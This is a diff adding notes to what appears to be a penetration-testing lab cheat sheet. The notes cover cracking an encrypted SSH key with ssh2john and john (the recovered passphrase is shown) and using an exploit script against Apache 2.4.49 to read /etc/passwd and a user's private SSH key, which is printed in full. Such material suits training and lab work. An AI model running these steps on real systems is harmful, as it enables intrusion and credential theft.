@@ -84,6 +84,22 @@ hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 
 chmod 600 id_rsa
 ssh mario@172.16.138.14 -i id_rsa
 ````
+##### Cracking Private key
+````
+ssh2john id_ecdsa > id_ecdsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash
+fireball         (id_ecdsa)
+````
+##### Path to keys
+````
+/etc/ssh/*pub #Use this to find the type of key
+
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
+`````
+`````
+/home/anita/.ssh/id_ecdsa.pub #Use this to confirm the above exists
+/home/anita/.ssh/id_ecdsa #Use this to confirm the private key exists
+````
 #### Telnet port 23
 ##### Login
 ````
@@ -231,6 +247,37 @@ https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
 ````
 ````
 CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
+````
+##### Attack Vector
+###### 80/tcp   open  http     Apache httpd 2.4.49
+````
+In this case we were able to attack a box based on its apache server version.
+Its important we remember that these are valid initial footholds and we try them.
+````
+
+![image](https://user-images.githubusercontent.com/127046919/235004773-e29fa522-94c2-415c-954d-a006c3f0f215.png)
+
+````
+/exploit.sh targets.txt /etc/passwd           
+192.168.138.245:8000
+root:x:0:0:root:/root:/bin/bash
+
+./exploit.sh targets.txt /etc/ssh/*pub
+192.168.138.245:8000
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
+
+/exploit.sh targets.txt /home/anita/.ssh/id_ecdsa
+
+192.168.138.245:8000
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
+13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
+dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
+fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
+ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
+8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
+CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
+-----END OPENSSH PRIVATE KEY-----
 ````
 ##### ? notes
 ##### /etc/hosts FQDN
